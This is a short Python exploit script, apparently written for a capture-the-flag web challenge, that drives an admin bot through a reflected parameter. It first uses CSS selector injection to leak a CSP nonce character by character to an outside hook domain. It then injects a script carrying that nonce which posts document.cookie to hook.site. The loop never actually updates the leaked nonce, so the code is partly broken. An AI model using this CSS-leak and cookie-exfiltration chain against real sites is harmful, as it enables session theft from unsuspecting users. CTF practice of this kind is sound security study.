import requests
from string import ascii_letters, digits

alphanumeric = ascii_letters + digits

# Bot Configuration
BOT_URL = "http://20.189.72.196:8021/report/"
BOT_PROXY = "http://app:8020/"
HOOK_URL = "https://hook.site/"

# Target URL Parameters
param_name = "partnerName"

# Step 1: Leak Nonce
payload_1 = (
    "<style> input[name=nonce][value^='{{char}}']{ "
    "display: block !important; "
    "background: url(https://hook-site.com/{{char}}); "
    "} </style>"
)

leaked_nonce = ""

for char in alphanumeric:
    print
    data = {
        "url": f"{BOT_PROXY}?{param_name}={payload_1.replace(r"{{char}}", leaked_nonce+char)}"
    }

    response = requests.post(BOT_URL, data=data)

    # Print Server Response
    print(leaked_nonce+char, "Response Text:", response.text)


# Step 2: Get Flag
payload_2 = f'''<script nonce="{leaked_nonce}">fetch('{HOOK_URL}', {{
    "method": "POST",
    "mode": "no-cors",
    "body": document.cookie
}});</script>'''

data = {
    "url": f"{BOT_PROXY}?{param_name}={payload_2}"
}

response = requests.post(BOT_URL, data=data)

print("Response Text:", response.text)